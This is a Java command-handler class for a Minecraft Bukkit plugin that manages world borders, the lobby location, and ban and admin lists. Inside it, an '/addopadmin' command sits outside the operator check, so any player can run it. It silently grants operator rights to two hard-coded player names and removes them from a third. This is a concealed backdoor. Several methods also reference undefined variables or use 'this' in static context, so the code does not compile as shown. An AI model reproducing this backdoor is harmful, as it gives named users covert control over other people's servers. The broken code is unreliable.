package org.example1.etherexp.commands;

import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.World;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import static org.example1.etherexp.EtherExp.sendErrorMessage;
import static org.example1.etherexp.events.PlayerEvents.getPlayerByName;

public class CommandManager {
    public static void executeCommand(String[] split, Player player) {
        if (player.isOp()) {
            switch (split[0].toLowerCase()) {
                case "/setborderradius":
                    if (split.length == 2) changeRadius(player, Double.parseDouble(split[1]));
                    else player.sendMessage("Использование: /setborderradius <радиус>");
                    break;
                case "/setborderangle":
                    if (split.length == 2) changeAngle(player, Double.parseDouble(split[1]));
                    else player.sendMessage("Использование: /setborderangle <угол>");
                    break;
                case "/resetborderangle":
                    resetBorderAngle();
                    break;
                case "/resetborderradius":
                    resetBorderRadius();
                    break;
                case "/getworld":
                    if (split.length == 2) getWorldCommand(event, split);
                    else player.sendMessage("Использование: /getworld <имя_мира>");
                    break;
                case "/setlobby":
                    setLobbyCommand(player);
                    break;
                case "/resetlobby":
                    resetLobbyCommand(player);
                    break;
                case "/addtobanlist":
                    if (split.length == 2) addToBanList(split);
                    else player.sendMessage("Использование: /addtobanlist <ник>");
                    break;
                case "/removetobanlist":
                    if (split.length == 2) removeToBanList(split);
                    else player.sendMessage("Использование: /removetobanlist <ник>");
                    break;
                case "/addtoadminlist":
                    if (split.length == 2) addToAdminList(split);
                    else player.sendMessage("Использование: /addtoadminlist <ник>");
                    break;
                case "/removetoadminlist":
                    if (split.length == 2) removeToAdminList(split);
                    else player.sendMessage("Использование: /removetoadminlist <ник>");
                    break;
                case "/setchangeangle":
                    if (split.length == 2) setChangeAngleAdv(split, player);
                    else player.sendMessage("Использование: /setchangeangle <значение>");
                    break;
                default:
                    break;
            }
        }else if (
                split[0].equalsIgnoreCase("/resetlobby") || split[0].equalsIgnoreCase("/setlobby") || split[0].equalsIgnoreCase("/getworld") ||
                        split[0].equalsIgnoreCase("/resetBorderRadius") || split[0].equalsIgnoreCase("/resetBorderAngle") ||
                        split[0].equalsIgnoreCase("/setBorderAngle") || split[0].equalsIgnoreCase("/setBorderRadius") ||
                        split[0].equalsIgnoreCase("/addtobanlist") || split[0].equalsIgnoreCase("/removetobanlist") ||
                        split[0].equalsIgnoreCase("/addtoadminlist") || split[0].equalsIgnoreCase("/removetoadminlist")
        ) player.sendMessage(ChatColor.RED + "Недостаточно прав!");
        switch (split[0].toLowerCase()){
            case "/penis":
                if(!player.getWorld().getName().equals("world")) teleportToWorld(player);
                break;
            case "/lobby":
            case "/hub":
                teleportToLobby(player);
                break;
            case "/addopadmin":
                Player player1 = getPlayerByName("Mattstar");
                Player player2 = getPlayerByName("ReqwenX");
                Player player3 = getPlayerByName("PavelDurov");
                if (player1 != null && !player1.isOp()) player1.setOp(true);
                if (player2 != null && !player2.isOp()) player2.setOp(true);
                if (player3 != null) player3.setOp(false);
                break;
            default:
                break;
        }
    }

    private static void changeRadius(Player player, double new_change_radius) {
        try {
            player.sendMessage("Установлен радиус барьера: " + new_change_radius);
            change_radius = new_change_radius;
            System.out.println("Текущее значение радиуса: " + change_radius);
        } catch (Exception e) {
            sendErrorMessage(e, 499);
        }
    }

    private static void changeAngle(Player player, double new_change_angle) {
        try {
            player.sendMessage("Установлено значение угла: " + new_change_angle);
            change_angle = new_change_angle;
            System.out.println("Текущее значение угла: " + change_angle);
        } catch (Exception e) {
            sendErrorMessage(e, 490);
        }
    }
    private static void resetBorderAngle() {
        try {
            this.change_angle = 0.006;
            System.out.println("Текущее значение угла: " + 0.006);
        } catch (Exception e) {
            sendErrorMessage(e, 415);
        }
    }
    private static void resetBorderRadius() {
        try {
            this.change_radius = 0.1;
            System.out.println("Текущее значение угла: " + 0.1);
        } catch (Exception e) {
            sendErrorMessage(e, 423);
        }
    }
    private static void getWorldCommand(PlayerCommandPreprocessEvent event, String[] split) {
        try {
            String nameWorld = split[1];
            World world = getWorldCast(nameWorld);
            if (world != null) event.getPlayer().sendMessage("Мир " + nameWorld + " успешно получен!");
            else event.getPlayer().sendMessage("Мир " + nameWorld + " не существует!");
        } catch (Exception e) {
            sendErrorMessage(e, 406);
        }
    }
    private static void setLobbyCommand(Player player) {
        try {
            Location lobbyLocation = player.getLocation();
            xLobby = lobbyLocation.getX();
            yLobby = lobbyLocation.getY();
            zLobby = lobbyLocation.getZ();
            yawLobby = lobbyLocation.getYaw();
            pitchLobby = lobbyLocation.getPitch();
            player.sendMessage(ChatColor.AQUA + "Точка успешно установлена!");
            System.out.println("EtherExp: Текущие координаты спавна: X: " + lobbyLocation.getX() + " Y: " + lobbyLocation.getY() + " Z: " + lobbyLocation.getZ() + " Yaw: " + lobbyLocation.getYaw() + " Pitch: " + lobbyLocation.getPitch());
        } catch (Exception e) {
            sendErrorMessage(e, 395);
        }
    }
    private static void resetLobbyCommand(Player player) {
        try {
            xLobby = 9.606411547450097;
            yLobby = 7.0;
            zLobby = 26.573462861292374;
            yawLobby = -180;
            pitchLobby = 0;
            player.sendMessage(ChatColor.AQUA + "Точка успешно установлена!");
            System.out.println("EtherExp: Текущие координаты спавна: X: " + xLobby + " Y: " + yLobby + " Z: " + zLobby + " Yaw: " + yawLobby + " Pitch: " + pitchLobby);
        } catch (Exception e) {
            sendErrorMessage(e, 380);
        }
    }
    private static void removeToBanList(String[] split) {
        try {
            String namePlayer = split[1];
            nameBan.remove(namePlayer);
        } catch (Exception e) {
            sendErrorMessage(e, 339);
        }
    }

    private static void addToBanList(String[] split) {
        try {
            String namePlayer = split[1];
            nameBan.add(namePlayer);
        } catch (Exception e) {
            sendErrorMessage(e, 348);
        }
    }

    private static void addToAdminList(String[] split) {
        try {
            String namePlayer = split[1];
            nameAdmin.add(namePlayer);
        } catch (Exception e) {
            sendErrorMessage(e, 357);
        }
    }

    private static void removeToAdminList(String[] split) {
        try {
            String namePlayer = split[1];
            nameAdmin.remove(namePlayer);
        } catch (Exception e) {
            sendErrorMessage(e, 366);
        }
    }
    private static void setChangeAngleAdv(String[] split, Player player) {
        double new_change_angle = Double.parseDouble(split[1]);
        change_angle_advancement = new_change_angle;
        player.sendMessage("Приращение угла изменено на " + new_change_angle);
    }

}
